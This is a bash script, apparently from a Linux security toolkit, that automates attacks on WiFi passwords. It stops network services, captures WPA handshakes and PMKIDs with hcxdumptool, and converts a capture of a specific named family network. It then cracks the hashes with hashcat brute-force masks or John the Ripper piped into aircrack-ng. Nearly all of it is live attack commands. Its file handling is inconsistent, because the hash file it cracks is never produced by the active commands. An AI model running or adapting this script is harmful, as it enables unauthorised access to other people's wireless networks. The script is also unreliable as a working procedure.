#!/bin/bash
scripts_dir=/opt/easy-linux
#install and use hcxtools w hashcat and jack
#
set -e
#
trap source ${scripts_dir}/support/support-trap-wifi.sh EXIT
source ${scripts_dir}/.envrc
# Version: 0.0.2
#
Test_func() {
	clear
	source ${scripts_dir}/support/support-Banner_func.sh
	printf "${OG}             What test do you want to run?\\n"
	printf "  \\n"
	printf "   ${OG}1] ${CY}Injection Test - Test your network adapters packet injection abilities.\\n"
	printf "   ${OG}2] ${CY}Driver Test - Runs several tests to determine if the driver supports all IOCTL calls. \\n"
	printf "   \\n"
	printf "   ${OG}99] ${CY}Return to the main menu.                       ${RED} [✘] Exit tool [✘]\"${CY}\" \\n "
	read -r -p "Which test?" test
	clear
	source ${scripts_dir}/support/support-Banner_func.sh

	if [[ ${test} = 1 ]]; then
		sudo systemctl stop NetworkManager
		sudo systemctl stop wpa_supplicant
		sudo hcxdumptool --check_injection -i "${adapter}"
	elif [[ ${test} = 2 ]]; then
		sudo systemctl stop NetworkManager
		sudo systemctl stop wpa_supplicant
		sudo hcxdumptool --check_driver -i "${adapter}"
	elif [[ ${test} = 99 ]]; then
		source ${scripts_dir}/install/menu-master.sh
	elif [[ ${test} = "x" ]] || [[ ${test} = "X" ]]; then
		clear
		printf "    ${RED}0. [✘] Exit tool [✘]${NC} \\n"
		exit 0
	else
		printf "${RED}  Invalid Selection${NC}\\n"
	fi
}

#
clear
printf "${OG}   \\n"
source ${scripts_dir}/support/support-Banner_func.sh
#
#  These 2 commands are repeated twice!!!
printf "  Starting...Please wait...${WT} \\n "
echo
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant
echo
printf "  Continuing in${WT}"
sleep 1
printf " 3..${YW}"
sleep 1
printf " 2..${GN}"
sleep 1
printf " 1..${CY}  \\n    "
sleep 1
printf "Stopping problem processes. Please wait...  \\n "
sleep 1
printf "  \\n"
sleep 1
printf "  Continuing in ${WT}3..${YW}"
sleep 1
printf " 2..${GN}"
sleep 1
printf " 1..${CY}"
sleep 1
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
#  These 2 commands are repeated twice!!!
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
clear
echo
source ${scripts_dir}/support/support-netadapter.sh
printf " \\n ${WT}  "
printf "  Press [S] to continue scan...Please ${RED}do not interupt for 30 sec ${OG}scan...${WT}\\n"
echo
printf "     Scan will stop automatically when complete...\\n${WT}   "
echo
printf "  Press ${CY}[T]est to test adapters or ${WT}[S]can to scan AP's.${WT} \\n      "
read -r -p "[T]est or [S]can [t/S] ----> " torscan
torscan=${torscan:-S}
if [[ "${torscan}" = "T" ]] || [[ "${torscan}" = "t" ]]; then
	Test_func
elif [[ "${torscan}" = "S" ]] || [[ "${torscan}" = "s" ]]; then
        echo
	echo
	timeout -v 32s sudo hcxdumptool -i "${adapter}" --do_rcascan -o /opt/backup/root/handshakes/hcxdumptool.pcapng
else
	printf "${RED}  Invalid Selection   ${NC}\\n"
fi
#The --filterlist and --filtermode options are used to apply a whitelist filter to only capture traffic from the desired access point. The --disable_client_attacks option is used to avoid sending deauthentication packets to connected clients.
#sudo hcxdumptool -i ${adapter} -o /opt/backup/root/handshakes/hcxdumptool.pcapng -f 0 -f 1 -f 2 -f 4 -f 32 -f 64 --enable_status=1

#hcxdumptool -o hashes.16800 -i wlan0 --enable_status=1 --filterlist=whitelist.txt --filtermode=2 --disable_client_attacks
#hcxdumptool -o /opt/backup/root/handshakes/hashes.22000 -i ${adapter} --enable_status=1 --filterlist=whitelist.txt --filtermode=2 --disable_client_attacks

# Prompt the user to choose between John the Ripper and Hashcat
printf "Choose a tool for cracking the hash:"
printf "${OG}1] ${CY}John the Ripper"
printf "${OG}2] ${CY}Hashcat"
read -r ripperchoice
ripperchoice=${ripperchoice:-2}

# Capture the hashes with hcxdumptool
sudo hcxdumptool -i "${adapter}" --do_rcascan --enable_status=5 -tot=40 --filterlist=whitelist.txt --filtermode=2

sudo /usr/bin/hcxpcapngtool -o /opt/backup/root/handshakes/DanielsFam.pcapng /home/beesoc/security/handshakes/DanielsFamily_e8d2ffcaf196.pcap

if [[ ${ripperchoice} -eq 1 ]]; then
	# Crack the hash with John the Ripper using the OneRuleToRuleThemAll.rule
	john --wordlist=${WORDLIST} --rules="${RULES}" --stdout | aircrack-ng -w - -e SSID /opt/backup/root/handshakes/hashes.22000 -J /opt/backup/root/handshakes/cracked.txt
elif [[ "${ripperchoice}" -eq 2 ]]; then
	# Crack the hash with hashcat
	#  hashcat -m 22000 -a 1 -w 4 -o /opt/backup/root/handshakes/cracked.txt --force --opencl-device-types=1,2 ${WORDLIST} ?d?d?d?d?d?d?d?d?d --increment-min=8 --rule-file=OneRuleToRuleThemAll.rule /opt/backup/root/handshakes/hashes.22000
	hashcat -m 22000 -a 3 -w 4 -o /opt/backup/root/handshakes/cracked.txt --force --opencl-device-types=1,2 ${WORDLIST} /opt/backup/root/handshakes/hashes.22000 --increment --increment-min=8 --increment-max=13

else
	# Invalid choice
	printf "${RED}  Invalid choice. Exiting..."
	exit 1
fi

#First, capture the hashes with hcxdumptool and save them to a file
#hcxdumptool -o /opt/backup/root/handshakes/hashes.pcapng -i ${adapter} --enable_status=1

# Convert the pcapng file to a format that hashcat or john the ripper can use
#sudo /usr/bin/hcxpcapngtool -E essidlist -I identitylist -U usernamelist -z hashfile hashes.pcapng

# Now you can use hashcat or john the ripper to crack the captured hashes
# The example below shows how to use hashcat with a wordlist attack
#hashcat -m 22000 -a 0 -o cracked.txt --force --opencl-device-types=1,2 --remove --rule-file=OneRuleToRuleThemAll.rule --pw-min=8 --pw-max=13 hashfile ${WORDLIST}
#hashcat -m 22000 -a 1 -w 4 -o /opt/backup/root/handshakes/cracked.txt --force --opencl-device-types=1,2 $WORDLIST ?d?d?d?d?d?d?d?d?d --increment-min=8 /opt/backup/root/handshakes/hashes.22000

# Clean up the hash file
rm /opt/backup/root/handshakes/hashes.22000

sleep 1
#clear
printf "    ${OG}Restarting NetworkManager and wpa_supplicant..."
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
